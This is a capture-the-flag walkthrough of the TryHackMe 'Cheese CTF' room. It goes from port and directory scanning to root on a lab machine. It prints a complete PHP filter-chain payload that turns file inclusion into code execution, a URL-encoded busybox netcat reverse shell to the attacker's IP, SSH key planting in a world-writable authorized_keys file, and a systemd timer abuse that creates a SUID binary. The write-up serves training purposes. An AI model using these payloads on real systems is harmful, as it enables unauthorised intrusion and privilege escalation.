---
title: Cheese CTF
date: 2025-01-04
categories: [TryHackMe, CTF]
tags: [tryhackme, ctf, web, gobuster, webshell, php_wrapper, ssh, sudo_permissions]     # TAG names should always be lowercase
comments: false
image: /assets/img/tryhackme/ctf/cheesectf/banner.png
---

> [This room](https://tryhackme.com/r/room/cheesectfv10) was inspired by a discussion between different TryHackMe users on their discord server.

## Recon & Initial Access

As always we start this challenge with a nmap scan :

```shell
nmap $TARGET
Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-02 21:52 CET
Nmap scan report for 10.10.230.98
Host is up (0.031s latency).

PORT      STATE SERVICE
1/tcp     open  tcpmux
3/tcp     open  compressnet
4/tcp     open  unknown
6/tcp     open  unknown
7/tcp     open  echo
9/tcp     open  discard
13/tcp    open  daytime
17/tcp    open  qotd
19/tcp    open  chargen
20/tcp    open  ftp-data
21/tcp    open  ftp
22/tcp    open  ssh
23/tcp    open  telnet
24/tcp    open  priv-mail
25/tcp    open  smtp
26/tcp    open  rsftp
30/tcp    open  unknown
32/tcp    open  unknown
33/tcp    open  dsp
37/tcp    open  time
42/tcp    open  nameserver
43/tcp    open  whois
49/tcp    open  tacacs
53/tcp    open  domain
70/tcp    open  gopher
79/tcp    open  finger
80/tcp    open  http
81/tcp    open  hosts2-ns
[...]
62078/tcp open  iphone-sync
63331/tcp open  unknown
64623/tcp open  unknown
64680/tcp open  unknown
65000/tcp open  unknown
65129/tcp open  unknown
65389/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 72.32 seconds
```
As we can see, the result from this scan is quite surprising as a LOT of ports are open with different services (reduced in the example above).

Obviously, among all these services, a web server is running on port `80`. The landing page of the server seems to be an online cheese shop which has a **Login** tab.

![1](/assets/img/tryhackme/ctf/cheesectf/1.png)

![2](/assets/img/tryhackme/ctf/cheesectf/2.png)

I have tried a few common passwords and usernames but this does not give any hints so far.

So, after enumerating the directories using **Gobuster**, we can find something interesting :

```shell
$ gobuster dir -u http://10.10.230.98 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 30 -x php,jpg,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.230.98
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,jpg,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.hta.html            (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.hta.jpg             (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htaccess.jpg        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.jpg        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/images               (Status: 301) [Size: 313] [--> http://10.10.230.98/images/]
/index.html           (Status: 200) [Size: 1759]
/index.html           (Status: 200) [Size: 1759]
/login.php            (Status: 200) [Size: 834]
/messages.html        (Status: 200) [Size: 448]
/orders.html          (Status: 200) [Size: 380]
/server-status        (Status: 403) [Size: 277]
/users.html           (Status: 200) [Size: 377]
Progress: 18936 / 18940 (99.98%)
===============================================================
Finished
===============================================================
```

Here, `users.html`, `orders.html` are not much interest but when we head to `/messages.html`, we see a **link** towards another file on the target called `secret-script.php`.

![3](/assets/img/tryhackme/ctf/cheesectf/3.png)

We click on it and are displayed a message. If we look at the **URL**, it really much looks like a **php script** that we can use to **access files** on the machine :

![4](/assets/img/tryhackme/ctf/cheesectf/4.png)

So we try to put `/etc/passwd` in the file parameter and actually get it :

![5](/assets/img/tryhackme/ctf/cheesectf/5.png)

Thanks to this, we can acknowledge the user named “comte”. We can also retrieve the hostname of the machine at /etc/hostname but nothing that we can really do with poor privileges (we suppose, as `www-data` which is only allowed to access web content).

As of this first vulnerability that allows us to read files, we can also notice that the original link is using a **php wrapper** (which allows us to access various resources or protocols in PHP, for handling file systems, data streams, etc).

Considering this special hint, we can browse the web to better understand how this works and what kind of vulnerabilities we could exploit with it.

During those researches, I found a [very helpful article](https://medium.com/@sundaeGAN/php-wrapper-and-lfi2rce-81c536ef7a06) explaining how we can use such a feature to obtain **RCE** on the target machine.

Reading it from A to Z, we can easily craft an URL payload to enter in our browser :

```console
http://10.10.131.228/secret-script.php?0=whoami&file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

What does all of this mean ? Briefly explained, the command we want to execute and the garbage text (with the different encodings, called the **filter chain**) is used to add some text to `php://temp` which allows to temporarily store data without explicitly creating a physical file on the filesystem. This is the way we can create a **webshell**.

And thankfully, the output is exactly as we expected !

![6](/assets/img/tryhackme/ctf/cheesectf/6.png)

We get a webshell under the `www-data` user. Now, we can set up a [reverse shell](https://www.revshells.com/) and a listener on our machine, then [upgrading](https://0xffsec.com/handbook/shells/full-tty/) it for more convenience :

```console
http://10.10.131.228/secret-script.php?0=busybox%20nc%2010.14.83.7%201337%20-e%20sh&file=php://filter/convert.iconv.UTF8.CSISO2022KR|[...]|convert.base64-decode/resource=php://temp
```

Then, we receive the reverse shell :

```shell
$ rlwrap nc -lvnp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.131.228.
Ncat: Connection from 10.10.131.228:56506.
$ ls
adminpanel.css
images
index.html
login.css
login.php
messages.html
orders.html
secret-script.php
style.css
supersecretadminpanel.html
supersecretmessageforadmin
users.html

$ whoami
www-data
```

## Switching User

After looking for a while, I gave a look at the `login.php` file and found some interesting things, such as `comte` user **credentials** for **mysqli** :

![7](/assets/img/tryhackme/ctf/cheesectf/7.png)

Using this hardcoded passwords, I could get into the MariaDB console and dump the users table and found a password for the user `comte` (for the web application but maybe it also works for the local machine) hashed with **MD5**.

![8](/assets/img/tryhackme/ctf/cheesectf/8.png)

Unfortunately, I could not crack this hash using different wordlists and hashcat. So let’s move on to something else !

I tried to find any particular hints in the common folders where we would usually find vulnerabilities, looking for hidden files with special rights. And by searching writable files with my privileges, I found that the .ssh folder in `comte`’s home contains the (empty) `authorized_keys` with **write rights** for everyone :

```shell
www-data@cheesectf:/home/comte/.ssh$ ls -la
ls -la
total 8
drwxr-xr-x 2 comte comte 4096 Mar 25  2024 .
drwxr-xr-x 7 comte comte 4096 Apr  4  2024 ..
-rw-rw-rw- 1 comte comte    0 Mar 25  2024 authorized_keys
```

We instantly know what it means, we can generate a **SSH key pair** and simply paste our **public key** in the `authorized_keys` file, then use our **secret key** from our attacker machine to connect as `comte` with SSH and retrieve the **first flag**.

```shell
# Generate the key pair
user@att-machine:~$ ssh-keygen -t rsa -b 4096
```

```shell
# Paste the public key in /home/comte/.ssh/authorized_keys
www-data@cheesectf:/home/comte/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQ[...]0jKJzswseB4Ut8bl6aGHTlOk6X2UhoQ== user@att-machine" >> authorized_keys
```

```shell
# Connect to the target machine with our private key
user@att-machine:~$ ssh -i ./id_rsa comte@10.10.131.228
```

![9](/assets/img/tryhackme/ctf/cheesectf/9.png)


## Privilege Escalation

Because I have already tried a few different techniques to elevate my privileges from `www-data`. The first thing I type with the `comte` account is the `sudo -l` command.

```shell
comte@cheesectf:~$ sudo -l
User comte may run the following commands on cheesectf:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
```

As we can see, we have **full rights** (and with no password required) on a service timer called `exploit.timer`. Let’s first check the status of this service : 

```shell
comte@cheesectf:~$ systemctl status exploit.timer
● exploit.timer - Exploit Timer
     Loaded: bad-setting (Reason: Unit exploit.timer has a bad unit file setting.)
     Active: inactive (dead)
    Trigger: n/a
   Triggers: ● exploit.service
```

Apparently, the service is **inactive (dead)** because of *“bad unit file setting”* and is triggered by the `exploit.service`, hmm interesting! By looking at the settings of the service, we see that there is indeed a parameter that was forgotten :

```shell
comte@cheesectf:~$ systemctl cat exploit.timer
# /etc/systemd/system/exploit.timer
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=

[Install]
WantedBy=timers.target
```

```shell
comte@cheesectf:~$ cat /etc/systemd/system/exploit.service
[Unit]
Description=Exploit Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
```

The `exploit.service` which is triggered by `exploit.time` is copying the **xxd** binary to the `/opt` directory and adds the **SUID bit** on it.

What’s more, we have all privileges on the modification of the `exploit.timer` file so let’s try to put up a trick :

```shell
comte@cheesectf:~$ ls -l /etc/systemd/system/exploit.*
-rw-r--r-- 1 root root 141 Mar 29  2024 /etc/systemd/system/exploit.service
-rwxrwxrwx 1 root root  87 Mar 29  2024 /etc/systemd/system/exploit.timer
```

```shell
comte@cheesectf:~$ systemctl cat exploit.timer
# /etc/systemd/system/exploit.timer
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=10 # We schedule to start the service after 10 seconds

[Install]
WantedBy=timers.target
```

Once that is done, we can check `/opt` and there is indeed the **xxd** binary owned by **root** with the **SUID bit** :

```shell
comte@cheesectf:~$ ls -l /opt
total 20
-rwsr-sr-x 1 root root 18712 Jan  3 20:02 xxd
```

Using [GTFOBins](https://gtfobins.github.io/gtfobins/xxd/), we can use that **SUID bit** to read any file, so we choose to read `/root/root.txt` :

![10](/assets/img/tryhackme/ctf/cheesectf/10.png)